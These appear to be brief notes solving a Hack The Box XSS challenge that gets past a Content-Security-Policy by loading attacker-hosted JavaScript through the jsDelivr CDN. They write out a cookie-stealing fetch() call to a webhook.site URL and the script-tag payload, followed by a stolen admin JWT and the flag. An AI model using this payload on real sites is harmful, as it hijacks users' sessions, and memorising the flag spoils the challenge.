'''
Content-Security-Policy
XSS But CDN Cache

https://blog.csdn.net/qq_37370714/article/details/129836232

https://www.jsdelivr.com/?docs=gh

webhook.site

Create js in github
fetch('https://webhook.site/7c282874-17b8-4ea9-a929-307b4bd34d5f?cookie='+document.cookie);

Try
https://cdn.jsdelivr.net/gh/ShundaZhang/test/test2.js

<script src=https://cdn.jsdelivr.net/gh/ShundaZhang/test/test2.js></script> in submit form

session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Qwbid0XzRsbDB3X2Nkbl8xbl9jNXAhIX0iLCJpYXQiOjE3MDkyMDk0NTR9.72np9063aK3QIVm50QxuLJk2QcTGlduKYqq9oC5pTfs

jwt.io

HTB{d0n't_4ll0w_cdn_1n_c5p!!}
'''
